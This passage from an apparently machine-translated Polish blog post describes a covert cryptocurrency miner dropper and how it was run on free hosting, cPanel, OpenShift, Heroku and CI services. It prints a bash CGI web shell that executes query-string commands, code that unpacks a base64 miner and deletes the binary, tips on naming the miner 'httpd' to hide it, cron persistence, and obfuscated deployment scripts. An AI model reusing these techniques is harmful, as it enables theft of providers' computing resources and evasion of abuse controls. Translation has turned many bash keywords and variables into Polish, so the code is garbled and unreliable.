KONFIG=<span class="hljs-variable"> ${KONFIG/<span class="hljs-variable"> ${pasuje[0]}</span>/<span class="hljs-variable"> ${mecze[1]}</span>$subs<span class="hljs-variable"> ${mecze[5]}</span>}</span><span class="hljs-built_in"> przerwa</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Gotowe</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-subst"> $(printf '%s'<span class="hljs-string">"<span class="hljs-variable"> $KONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}

<span class="hljs-comment"> ## wyjściowa wartość konfiguracyjna minera 1 USD bez notowania</span> 
gc_rgx=<span class="hljs-string"> ' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class="hljs-function"><span class="hljs-title"> get_config</span></span>() {
	<span class="hljs-keyword"> podczas</span><span class="hljs-built_in"> czytać</span>  l;<span class="hljs-keyword"> robić</span><span class="hljs-keyword"> Jeśli</span> [ <span class="hljs-string">"<span class="hljs-variable"> ${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> ${l/\"*$1*\"*:/}</span>"</span> ]; <span class="hljs-keyword"> następnie</span>
			[[ <span class="hljs-string">"<span class="hljs-variable"> ${l}</span>"</span> =~ <span class="hljs-variable"> $gc_rgx</span>  ]]
[ -n<span class="hljs-string">"<span class="hljs-variable"> ${BASH_REMATCH[2]}</span>"</span> ] &amp;&amp;
				<span class="hljs-built_in"> printf</span><span class="hljs-string"> '%s'</span><span class="hljs-string">"<span class="hljs-variable"> ${BASH_REMATCH[2]}</span>"</span> ||
				<span class="hljs-built_in"> printf</span><span class="hljs-string"> '%s'</span><span class="hljs-string">"<span class="hljs-variable"> ${BASH_REMATCH[3]}</span>"</span><span class="hljs-built_in"> przerwa</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Gotowe</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-subst"> $(printf '%s'<span class="hljs-string">"<span class="hljs-variable"> $KONFIG</span>"</span> 2&gt;/dev/null)</span>"</span>
}</code></pre><p> Pozwala nam to tylko na edycję pojedynczych linii, dla wpisów wieloliniowych uwzględnia tylko pierwszą linię... ale jest wystarczająco dobre dla naszego przypadku użycia.</p><h2 id="runtime"><a class="header-anchor" href="#runtime"> Czas pracy</a></h2><p> Jak wygląda nasze środowisko wykonawcze? Mamy główny proces basha, który wykonuje główną pętlę, następnie podproces górnika, podproces monitora procesora, szafkę i tuner. To prawie garstka.</p><p> Najpierw chcemy mieć pewność, że jeśli coś pójdzie nie tak, nie zostawimy bałaganu, co oznacza, że ​​używamy bash trap do wykonywania porządków po zakończeniu</p><pre><code class="bash hljs"><span class="hljs-built_in">trap</span><span class="hljs-string">"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &amp;&gt;/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code>  usuwa pułapkę, aby zapobiec rekursji. Pułapka zabija wszystkie miejsca pracy i usuwa środowisko pracy.</p><p> Czas uruchomić górnika, który jest przechowywany jako zmienna bash w kodowaniu base64. Zrzucamy go do systemu plików, następnie zrzucamy konfigurację, uruchamiamy górnika i usuwamy zarówno górnika, jak i konfigurację. W systemie Linux możesz usunąć plik wykonywalny uruchomionego procesu (w systemie Windows jest to niedozwolone).<sup id="fnref:memoryondemand"><a class="fnref" href="#fndef:memoryondemand">[8]</a></sup>  Kiedy górnik jest uruchomiony, w systemie plików jest tylko<code>.. /</code>  katalog z<code>b64</code>  link w nim.</p><pre><code class="bash hljs"><span class="hljs-comment">## put a file $1 into a var $2</span><span class="hljs-function"><span class="hljs-title">fileToVar</span></span>(){
    <span class="hljs-built_in">declare</span> -n tmpd=<span class="hljs-string">"<span class="hljs-variable"> $2</span>"</span>  &amp;&amp; tmpd=$(b64e<span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span>) &amp;&amp; <span class="hljs-built_in"> powrót</span><span class="hljs-keyword"> Jeśli</span>  [ -z<span class="hljs-string">"<span class="hljs-variable"> $tmpd</span>"</span> ]; <span class="hljs-keyword"> następnie</span><span class="hljs-built_in"> Dziennik</span><span class="hljs-string">"gobbling in array"</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"<span class="hljs-variable"> $2</span> =1"</span><span class="hljs-comment"> ## unikaj pustych czeków</span> 
        pożerany<span class="hljs-variable"> $2</span> ]=$(b64e<span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span>)
    <span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-built_in"> powrót</span> 1 <span class="hljs-comment"> ## nie cytuj przypisania, w przeciwnym razie pamięć RAM nie zostanie wydana</span><span class="hljs-keyword">fi</span>
}
<span class="hljs-comment"> ## wstaw zmienną $1 do pliku $2</span><span class="hljs-function"><span class="hljs-title"> varToFile</span></span>(){
    <span class="hljs-keyword"> Jeśli</span>  [ -n<span class="hljs-string">"<span class="hljs-variable"> $GŁOŚNIK</span>"</span> ]; <span class="hljs-keyword"> następnie</span><span class="hljs-keyword"> Jeśli</span><span class="hljs-built_in"> ogłosić</span>  -n 2&gt;&gt;<span class="hljs-variable"> ${GŁOŚNIK}</span> &amp;&amp; <span class="hljs-built_in">oceniać</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\$<span class="hljs-variable"> $1</span> \" 1&gt;\"<span class="hljs-variable"> $2</span> \" 2&gt;&gt;<span class="hljs-variable"> ${GŁOŚNIK}</span>"</span>; <span class="hljs-keyword"> następnie</span><span class="hljs-built_in"> powrót</span><span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-comment"> # log "zrzucanie z tablicy"</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\${gobbled[<span class="hljs-variable"> $1</span> ]}\" 1&gt;\"<span class="hljs-variable"> $2</span> \" 2&gt;&gt;<span class="hljs-variable"> ${GŁOŚNIK}</span>"</span> &amp;&amp; <span class="hljs-built_in"> powrót</span><span class="hljs-keyword">fi</span><span class="hljs-built_in"> powrót</span> 1
    <span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-keyword"> Jeśli</span><span class="hljs-built_in"> ogłosić</span>  -n &amp;&amp;<span class="hljs-built_in">oceniać</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\$<span class="hljs-variable"> $1</span>\" &gt;\"<span class="hljs-variable"> $2</span>\""</span>; <span class="hljs-keyword"> następnie</span><span class="hljs-built_in"> powrót</span><span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-comment"> # log "zrzucanie z tablicy"</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\${gobbled[<span class="hljs-variable"> $1</span>]}\" &gt;\"<span class="hljs-variable"> $2</span>\""</span> &amp;&amp; <span class="hljs-built_in"> powrót</span><span class="hljs-keyword">fi</span><span class="hljs-built_in"> powrót</span> 1
    <span class="hljs-keyword">fi</span>
}</code></pre><p>Irytującym dziwactwem napotkanym z bashem podczas kodowania górnika jest to, że przypisanie zmiennej z podpowłoką z cudzysłowami<code>myvar="$(something)"</code>  powoduje stały wzrost zużycia pamięci, było to trudne do debugowania i tak naprawdę nie znalazłem powodu, dla którego zachowuje się w ten sposób, w każdym razie przypisanie musi być niecytowane. Zamiast tego dekodowanie odbywa się za pomocą<em> herestrings</em>  która jest abstrakcją nad plikami tymczasowymi, zmienna jest zrzucana do pliku, który jest następnie przesyłany z powrotem do procesu.</p><p> Górnicza długa pętla biegowa:</p><ul><li><p> podczas gdy prawda</p><ul><li><p> zatrzymaj górnika</p></li><li><p> usuń konfigurację</p></li><li><p> zacznij górnika</p></li><li><p> podczas gdy prawda</p><ul><li><p> Uruchom demona</p><ul><li><p> gdy górnik działa</p><ul><li><p> przeczytaj dane wyjściowe z górnika</p></li><li><p> wybierz akcję górnika na podstawie linii wyjściowej</p></li></ul></li></ul></li><li><p> jeśli górnik nie działa: przerwa</p></li></ul></li><li><p> spać</p></li></ul></li></ul><p> Linia wyjściowa jest dopasowywana do jakiegoś wyrażenia regularnego:</p><pre><code class="bash hljs">act_rgx=<span class="hljs-string">'(accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p> Demon obsługuje przypadki, w których</p><ul><li><p> połączenie z punktem końcowym daje błędy (wybierz nowy losowy punkt końcowy)</p></li><li><p> zmiany algorytmu haszującego (dostosuj czas uśpienia i konfiguracje ad-hoc)</p></li><li><p> problemy z górnikiem (zrestartuj górnika).</p></li></ul><p> Przez pewien czas istniała obsługa pulpitu sterowania i kontroli, co pozwalało na ręczne uruchamianie restartów, jednak ponieważ jego użycie było minimalne, zostało odrzucone, a jego punkty końcowe zastąpione alternatywnym połączeniem puli, również proces restartu był niestabilny, złożony. ...kolejny przypadek zadłużenia technologicznego. Umożliwiło to jednak ponowne pobranie zaktualizowanego ładunku i ponowne skonfigurowanie wszystkich konfiguracji w locie, co było całkiem fajne, najlepszą trampoliną.</p><h2 id="debugging"><a class="header-anchor" href="#debugging"> Debugowanie</a></h2><p> Istnieją trzy główne narzędzia</p><ul><li><p> włączyć/wyłączyć śledzenie wokół bloków kodu (nie chcemy śledzić pliku binarnego zakodowanego w formacie b64 w zmiennej..)</p></li><li><p> prosta funkcja do formatowania logów</p></li><li><p>flaga, która aktywowałaby pełne rejestrowanie w czasie wykonywania po uruchomieniu górnika.</p><ul><li><p> czy plik?<code>.debug</code>  istnieć?</p><ul><li><p> włącz pełne rejestrowanie</p></li></ul></li></ul></li></ul><h2 id="target_deployments"><a class="header-anchor" href="#target_deployments"> Wdrożenia docelowe</a></h2><p> Ta konfiguracja została przetestowana na 3 rodzajach hostów:</p><h3 id="self_hosted_containers_or_vms"><a class="header-anchor" href="#self_hosted_containers_or_vms"> Kontenery hostowane samodzielnie lub maszyny wirtualne</a></h3><p> Wielu dostawców hostingu nie lubi kopania, ponieważ zasoby procesora są zwykle dzielone między wielu użytkowników, a oprogramowanie do kopania może łatwo spowolnić węzeł hosta, wpływając na wydajność pozostałych użytkowników. Może to być prawdą, nawet jeśli czas użytkownika procesora jest nieograniczony, ponieważ algorytmy mieszające mogą nasycić wszystkie warstwy pamięci podręcznej procesora, jeśli pamięć podręczna jest współdzielona przez wszystkie rdzenie procesora.</p><p> Chcielibyśmy skorzystać z naszego<em> sprawiedliwy</em>  udostępnianie zasobów bez zbanowania, to dobry przypadek użycia naszego ukrytego droppera, ponieważ jest świadomy użycia hosta, co oznacza, że<em> powinnam</em>  pozostań trochę w obrębie [AUP]. W przypadku wdrożeń samoobsługowych nie ma żadnych dodatkowych kroków, wystarczy skrypt uruchamiający, który może zostać dodany do sekwencji rozruchowej lub uruchomiony ręcznie.</p><h3 id="cpanel_based_web_hosting"><a class="header-anchor" href="#cpanel_based_web_hosting"> Hosting oparty na cPanel</a></h3><p> Plany subskrypcji hostingu są najczęściej oferowane za pośrednictwem [cPanel]. Ponownie tutaj używamy osobistych planów subskrypcji, które mają rozsądne limity zasobów, z drugiej strony każdy darmowy plan ma absurdalne limity<sup id="fnref:freehostinglimits"><a class="fnref" href="#fndef:freehostinglimits">[9]</a></sup> . cPanel pozwala zdefiniować programy obsługi dla różnych rozszerzeń plików, co pozwala nam wykonywać skrypty powłoki za pomocą<a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface"> cgi</a>  z żądaniem http skierowanym do skryptu powłoki przesłanego na serwer. Takie interfejsy wyglądają jak powłoki sieciowe<sup id="fnref:cpanelssh"><a class="fnref" href="#fndef:cpanelssh">[10]</a></sup> . Prosta powłoka internetowa bash</p><pre><code class="bash hljs"><span class="hljs-comment"># without content encoding the request response won't be honored</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class="hljs-comment">## parse vars (for interactive use)</span>
saveIFS=<span class="hljs-variable">$IFS</span>
IFS=<span class="hljs-string">'=&amp;'</span>
parm=(<span class="hljs-variable">$QUERY_STRING</span>)
IFS=<span class="hljs-variable">$saveIFS</span><span class="hljs-keyword">for</span> ((i=0; i&lt;<span class="hljs-variable">${#parm[@]}</span>; i+=2))
<span class="hljs-keyword">do</span><span class="hljs-built_in">declare</span> var_<span class="hljs-variable">${parm[i]}</span>=<span class="hljs-variable">${parm[i+1]}</span><span class="hljs-keyword">done</span><span class="hljs-comment">## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class="hljs-string">"<span class="hljs-variable"> ${ścieżka_zmiennej//+/ }</span>"</span><span class="hljs-built_in"> eksport</span>  ŚCIEŻKA=<span class="hljs-string">".:<span class="hljs-variable"> $PATH</span>"</span> 
. /dev/shm/srv/utils/load.env &amp;&gt;/dev/null

<span class="hljs-keyword"> Jeśli</span><span class="hljs-built_in"> ogłosić</span>  -F<span class="hljs-string">"<span class="hljs-variable"> ${url_encoded/\%20*}</span>"</span> 1&gt;/dev/null; <span class="hljs-keyword"> następnie</span><span class="hljs-comment"> ## nie używaj -n, przekieruj fd dla bcompat</span><span class="hljs-built_in"> printf</span><span class="hljs-string"> '%b'</span><span class="hljs-string">"<span class="hljs-variable"> ${url_encoded//%/\\x}</span>"</span>  &gt; /tmp/<span class="hljs-variable"> ${SERVER_NAME}</span> .src
<span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-keyword"> Jeśli</span><span class="hljs-built_in"> wbudowany</span><span class="hljs-string">"<span class="hljs-variable"> ${url_encoded/\%20*}</span>"</span>; <span class="hljs-keyword"> następnie</span><span class="hljs-built_in"> printf</span><span class="hljs-string"> '%b'</span><span class="hljs-string">"<span class="hljs-variable"> ${url_encoded//%/\\x}</span>"</span>  &gt; /tmp/<span class="hljs-variable"> ${SERVER_NAME}</span> .src
    <span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-built_in"> printf</span><span class="hljs-string"> 'wykonaj %b'</span><span class="hljs-string">"<span class="hljs-variable"> ${url_encoded//%/\\x}</span>"</span>  &gt; /tmp/<span class="hljs-variable"> ${SERVER_NAME}</span> .src
    <span class="hljs-keyword">fi</span><span class="hljs-keyword">fi</span> 
. /tmp/<span class="hljs-variable"> ${SERVER_NAME}</span> .src</code></pre><p> Lepiej polegać tylko na poleceniach wbudowanych, ponieważ rozwidlenie dodatkowych procesów może nie być dozwolone w więzieniach internetowych, ale zawsze jest możliwe<code>exec</code>  co pozwala nam korzystać z większości narzędzi wiersza poleceń. Większość powłok internetowych jest napisana w innych językach skryptowych, takich jak python lub php, ponieważ nie musisz się martwić o rozwidlenie.</p><p> W środowisku cpanel lepiej jest użyć statycznej nazwy dla procesu górnika, na przykład<code>httpd</code>  lub<code>php-fpm</code>  ponieważ<code>cgi</code>  opiera się na wielu procesach, więc serwery są zawsze wypełnione wieloma procesami o takiej nazwie, chociaż uważny obserwator powinien to zauważyć<em> wielowątkowy</em>  wzorzec użycia, który zdecydowanie nie jest powszechny (lub możliwy) dla języków takich jak perl, php, ruby ​​lub python!</p><p> Procesy mają również domyślnie limit czasowy (1 godzina, 1 dzień itd.), w tym celu po prostu używamy zadania cron, które ponownie uruchamia dropper.</p><p> Wymagało to wielu ręcznej edycji, a cpanel api do zautomatyzowania tego niestety nie jest narażony na użytkowników końcowych, więc hosting jest niezgrabnym i nudnym celem dla naszego droppera.</p><h3 id="web_environments"><a class="header-anchor" href="#web_environments"> Środowiska internetowe</a></h3><p> Są<em> SaaS</em>  dostawcy, którzy mają edytor stron internetowych połączony z kontenerem, na przykład<a href="with a free tier before getting acquired by amazon"> chmura9</a> , [kodewszędzie], [kodenvy]. Wdrożenie droppera w tym miejscu jest łatwe (masz w pełni rozwinięte środowisko), ale utrzymanie go w działaniu jest uciążliwe, ponieważ każdy interaktywny edytor stron internetowych kończy sesję wkrótce po zamknięciu strony internetowej, a kontener jest konsekwentnie usypiany (chyba że ty oczywiście zapłacić).</p><p>Obejście tego może tylko oznaczać, że musimy utrzymywać otwarte sesje, niektóre skrypty z [lalkarze] osiągnęły pożądany rezultat, ale posiadanie długo działających, przeciekających pamięci, nadętych stron internetowych SPA jest zdecydowanie nieatrakcyjne i nie ukrywane, ponieważ od zaplecza dostawcy, sesja otwarta 24/7 na pewno będzie wyglądać podejrzanie. Rzeczywiście, środowiska internetowe są również niezgrabnymi i nudnymi celami.</p><h3 id="free_apps_services"><a class="header-anchor" href="#free_apps_services"> Darmowe usługi aplikacji</a></h3><p> To jest głównie<a href="when it used to have a free tier"> openshift</a><sup id="fnref:openshift"><a class="fnref" href="#fndef:openshift">[11]</a></sup>  i [heroku]. Openshift, będący kubernetes, był dość prosty do wdrożenia, ale pełen zmian w konfiguracji, oto fragment:</p><pre><code class="sh hljs"><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span>

[ -z <span class="hljs-string">"<span class="hljs-variable"> $OC_PRJ</span>"</span> ] &amp;&amp; { <span class="hljs-built_in"> Echo</span><span class="hljs-string">"no account data provided"</span>; <span class="hljs-built_in"> Wyjście</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class="hljs-variable"> $obfs</span> ] ||
    { <span class="hljs-built_in"> Echo</span><span class="hljs-string">"obfs utility not found!"</span>; <span class="hljs-built_in"> Wyjście</span> 1; }
launcher=~/launcher
[ -f <span class="hljs-variable"> $wyrzutnia</span> ] ||
    { <span class="hljs-built_in"> Echo</span><span class="hljs-string">"launcher script not found!"</span>; <span class="hljs-built_in"> Wyjście</span> 1; }

ctroot=<span class="hljs-variable"> ${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class="hljs-comment"> ## usługa, która uruchamia górnika, nazywa się app w /etc/services.d w rootfs</span> 
ścieżka skryptu=<span class="hljs-string">"rootfs/etc/services.d/app/run"</span> 
TYP=<span class="hljs-variable"> ${HRK_TYPE:-pracownik}</span> 
IMG=$(oc-punkt końcowy)/<span class="hljs-variable"> $OC_PRJ</span>/<span class="hljs-variable"> $OC_APP</span> 
tspath=/tmp/oc-tmp-apprun
dołączyć=<span class="hljs-string">"#!/usr/bin/with-contenv bash
"</span><span class="hljs-comment"> ## uważaj na nową linię ^^^</span><span class="hljs-built_in"> Płyta CD</span><span class="hljs-variable"> $ctroot</span> || { <span class="hljs-built_in"> Echo</span><span class="hljs-string">"couldn't find ct build directory"</span>; <span class="hljs-built_in"> Wyjście</span> 1; }

VARS=$(cat vars) || { <span class="hljs-built_in"> Echo</span><span class="hljs-string"> 'plik vars pusty!'</span> ; }
VARS=<span class="hljs-variable"> ${VARS//$'\n'/ }</span> 
VARS=<span class="hljs-variable"> ${WARIANTY//\\/\\\\}</span><span class="hljs-comment"> ## zachowaj ucieczki</span> 
skrypt=$(kot<span class="hljs-variable"> $wyrzutnia</span>  | ogon +2 | sed-r<span class="hljs-string"> '/^echo "eksport \\$/a '</span><span class="hljs-string">"<span class="hljs-variable"> $VARS</span>"</span><span class="hljs-string">' \\'</span> )
kot &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-variable"> $skrypt</span>"</span> &gt; <span class="hljs-variable"> $tspath</span><span class="hljs-variable"> $obfs</span><span class="hljs-variable"> $tspath</span> 
[ -z<span class="hljs-string">"<span class="hljs-variable"> ${tspath}</span> .obfs"</span> ] &amp;&amp; { <span class="hljs-built_in"> Echo</span><span class="hljs-string">"obfs file not found?"</span>; <span class="hljs-built_in"> Wyjście</span> 1; }
cat &lt;&lt;&lt; <span class="hljs-string">"$prepend<span class="hljs-subst"> $(kot<span class="hljs-string">"<span class="hljs-variable"> ${tspath}</span> .obfs"</span>)</span>"</span> &gt; <span class="hljs-variable"> $ścieżka do skryptu</span><span class="hljs-built_in"> exec</span>  sam (powinien<span class="hljs-built_in">oceniać</span> )
chmod +x<span class="hljs-variable"> $ścieżka do skryptu</span> 

kompilacja dokera -t<span class="hljs-variable"> $IMG</span>  . || <span class="hljs-built_in"> Wyjście</span> 1
<span class="hljs-built_in"> Płyta CD</span>  -
oc-push-image<span class="hljs-string">"<span class="hljs-variable"> $IMG</span>"</span></code></pre><p> To był skrypt użyty do zbudowania kontenera górniczego, który wymagał szablonu yaml:</p><pre><code class="yaml hljs"><span class="hljs-attr">apiVersion:</span><span class="hljs-string">build.openshift.io/v1</span><span class="hljs-attr">kind:</span><span class="hljs-string">BuildConfig</span><span class="hljs-attr">metadata:</span><span class="hljs-attr">labels:</span><span class="hljs-attr">build:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">spec:</span><span class="hljs-attr">activeDeadlineSeconds:</span><span class="hljs-number">5184000</span><span class="hljs-attr">failedBuildsHistoryLimit:</span><span class="hljs-number">0</span><span class="hljs-attr">successfulBuildsHistoryLimit:</span><span class="hljs-number">0</span><span class="hljs-attr">resources:</span><span class="hljs-attr">limits:</span><span class="hljs-attr">cpu:</span><span class="hljs-number">2</span><span class="hljs-attr">memory:</span><span class="hljs-string">1Gi</span><span class="hljs-attr">runPolicy:</span><span class="hljs-string">Serial</span><span class="hljs-attr">source:</span><span class="hljs-attr">type:</span><span class="hljs-string">Binary</span><span class="hljs-attr">strategy:</span><span class="hljs-attr">sourceStrategy:</span><span class="hljs-attr">from:</span><span class="hljs-attr">kind:</span><span class="hljs-string">ImageStreamTag</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}-build:latest</span><span class="hljs-attr">namespace:</span><span class="hljs-string">${OC_PRJ}</span><span class="hljs-attr">type:</span><span class="hljs-string">Source</span><span class="hljs-attr">template:</span><span class="hljs-attr">activeDeadlineSeconds:</span><span class="hljs-number">2400</span><span class="hljs-attr">triggers:</span><span class="hljs-bullet">-</span><span class="hljs-attr">generic:</span><span class="hljs-attr">secretReference:</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">type:</span><span class="hljs-string">Generic</span></code></pre><p> Ale cały proces składał się z wielu kroków!</p><pre><code class="sh hljs"><span class="hljs-comment">## init</span>
[ -z <span class="hljs-string">"<span class="hljs-variable"> $OC_APP</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> eksport</span>  $(&lt;$(tfi))
[ -z<span class="hljs-string">"<span class="hljs-variable"> $OC_APP</span>"</span>  ] &amp;&amp; { . ./wybierz-kredyty ||<span class="hljs-built_in"> Wyjście</span> 1; }
oc-login
oc new-project <span class="hljs-variable"> $OC_PRJ</span>  || { [-z<span class="hljs-string">"<span class="hljs-subst"> $(oc pobierz projekty)</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Wyjście</span> 1; }
oc new-app <span class="hljs-variable"> $OC_APP</span>  --allow-missing-images ||<span class="hljs-built_in"> Wyjście</span> 1

<span class="hljs-comment"> ## buduj okno z dockerem i push</span><span class="hljs-comment"> # oc-docker-login || wyjście 1</span> 
oc-buduj-kopalnia ||<span class="hljs-built_in"> Wyjście</span> 1

<span class="hljs-comment"> ## utwórz konfigurację DC</span><span class="hljs-built_in"> eksport</span>  OC_TEMPLATE_TYPE=mój
oc-box-szablon ||<span class="hljs-built_in"> Wyjście</span> 1
rtr=0
<span class="hljs-keyword"> podczas</span> [ <span class="hljs-variable">$rtr</span>  -lt 10];<span class="hljs-keyword"> robić</span> 
  oc wdrożenie najnowsze<span class="hljs-variable"> $OC_APP</span> &amp;&amp; <span class="hljs-built_in"> przerwa</span> 
  rtr=$((rtr+<span class="hljs-number">1</span>))
  <span class="hljs-built_in"> czytać</span>  -t 1
<span class="hljs-keyword"> Gotowe</span><span class="hljs-built_in"> Wyjście</span><span class="hljs-comment"> ## kompilacje</span> 
bash -x oc-buduj-buduj ||<span class="hljs-built_in"> Wyjście</span> 1
bash -x oc-build-template || <span class="hljs-built_in"> Wyjście</span> 1
oc start-build <span class="hljs-variable"> $OC_APP</span> || <span class="hljs-built_in"> Wyjście</span> 1

accounts=<span class="hljs-variable"> ${ACCOUNTS_DIR:-accounts_queue}</span> 
mv<span class="hljs-variable"> $konta</span>/<span class="hljs-variable"> ${OC_USR}</span> {\.to,\.$(data +%s)}</code></pre><p> W pseudokodzie:</p><ul><li><p> stworzyć projekt</p></li><li><p> utwórz aplikację bez obrazu</p></li><li><p> zbuduj kontener górniczy</p></li><li><p> wdrożyć kontener z konfiguracją wdrożenia (abstrakcja Kubernetes)</p></li><li><p> wdrożyć wdrożenie</p></li></ul><p> ten<code>build-build</code>  zamiast tego tworzone skrypty<em> budować</em>  pojemnik, który wydobywałby się przez kilka godzin na raz. Konstrukcje i zwykłe kapsuły mają osobne zasoby w trybie openshift, więc wykorzystaliśmy oba z nich. Openshift był ogólnie złym doświadczeniem, ponieważ przeszedł 4 różne wydania (może więcej, po pewnym czasie przestałem śledzić) i każda z nich wymagała zmian w konfiguracjach, nie miały ścieżek aktualizacji i wszystko było szybko iterowane i było to powszechne aby kompilacje / kapsuły mogły się zatrzymać i nie były zbierane śmieci ... zwykle uruchamiali ręczne restarty od czasu do czasu, może kubernetes był po prostu wadliwy :)</p><p> Konfiguracja Heroku była nieco prostsza (nie wymaga kubernetes). Poza budową kontenera, która była podobna do tej z openshift, reszta to tylko dwa polecenia cli</p><pre><code class="bash hljs">heroku config:<span class="hljs-built_in">set</span> HRK_APP=<span class="hljs-variable">$HRK_APP</span> -a <span class="hljs-variable">$HRK_APP</span>
heroku container:release -a <span class="hljs-variable">$HRK_APP</span><span class="hljs-variable">$TYPE</span></code></pre><p> Kontener został bezpośrednio przeniesiony z dokerem do rejestru heroku.<sup id="fnref:herokucontainers"><a class="fnref" href="#fndef:herokucontainers">[12]</a></sup>  Tarcia z heroku (którego darmowy poziom wciąż trwa do czasu pisania) polega na tym, że hamownie mogą działać tylko przez 22 dni w miesiącu, więc wymagały ręcznego zarządzania każdego miesiąca, znowu niezgrabne i nudne. Na początku wykonali kilka fal banów, a potem wyłączyli rejestracje przez TOR, jestem całkiem pewien, że byłem tego przyczyną.</p><h3 id="ci_containers_or_vms"><a class="header-anchor" href="#ci_containers_or_vms"> Kontenery CI lub maszyny wirtualne</a></h3><p>To były najbardziej synergiczne cele dla naszego droppera. Jest wiele<a href="https://en.wikipedia.org/wiki/Continuous_integration"> CI</a>  firmy, z których wiele pali pieniądze inwestorów, oferując darmowe poziomy w nadziei na zdobycie pewnego udziału w rynku w branży infrastruktury technologicznej.</p><p> Wszystkie te usługi oferują różne zasoby, mają różne wymagania konfiguracyjne i działają w różnych środowiskach. Nigdy nie brałem pod uwagę automatyzacji rejestracji konta, ponieważ tego rodzaju rzeczy są okropne w programowaniu, staram się ich unikać cały czas, więc po prostu znosiłem ręczne rejestracje przez jakiś czas, ponieważ byłem ciekawy, jaki rodzaj odpowiedzi antyspamowej otrzymam (i jak różni się od reszty!). Możesz odgadnąć kilka rzeczy na temat zarządzania firmą na podstawie tego, jak radzi sobie ze spamem:</p><ul><li><p> Czy wykonuje fale zakazu? Następnie mają nieścisłe zasady, problemy są obsługiwane ręcznie i w każdym przypadku z osobna</p></li><li><p> Czy wymaga weryfikacji telefonicznej? Byli już wykorzystywani w przeszłości</p></li><li><p> Czy reagują na duże zużycie zasobów? Mają napięty budżet</p></li><li><p> Czy stosują ograniczenia konta lub shadow bany? Jeśli zakazują cienia, mają złośliwych administratorów.</p></li></ul><p> Pojawia się też pytanie filozoficzne: jeśli usługa pozwala na nadużywanie swojego systemu przez długi czas, to czy to znaczy, że ma infrastrukturę z najwyższej półki zdolną do obsługi obciążenia, czy po prostu słabą kontrolę nad swoim systemem? Musisz wziąć pod uwagę równowagę między dostępnością a bezpieczeństwem, zbyt bezpieczny system może obniżyć retencję użytkowników.</p><p> Oto tabela przedstawiająca niektóre usługi, w których wdrożyłem:</p><table><tbody><tr class="header headerLastRow"><th style="text-align: center;"> ci</th><th style="text-align: center;"> konfiguracja</th><th style="text-align: center;"> wydajność</th><th style="text-align: center;"> ban-młot</th></tr><tr><td style="text-align: center;"> Bitrise</td><td style="color: red; text-align: center;"> zły</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Travis</td><td style="color: green; text-align: center;"> dobry</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: green; text-align: center;"> dobry</td></tr><tr><td style="text-align: center;"> Kodowanie</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: red; text-align: center;"> zły</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Gitlab</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: green; text-align: center;"> dobry</td><td style="color: green; text-align: center;"> dobry</td></tr><tr><td style="text-align: center;">Circleci</td><td style="color: red; text-align: center;"> zły</td><td style="color: green; text-align: center;"> dobry</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Semafor</td><td style="color: green; text-align: center;"> dobry</td><td style="color: green; text-align: center;"> dobry</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Doker</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: green; text-align: center;"> dobry</td></tr><tr><td style="text-align: center;"> Nadbrzeże</td><td style="color: green; text-align: center;"> dobry</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Odśwież kod</td><td style="color: red; text-align: center;"> zły</td><td style="color: green; text-align: center;"> dobry</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Wercker</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: red; text-align: center;"> zły</td></tr><tr><td style="text-align: center;"> Rurociągi lazurowe</td><td 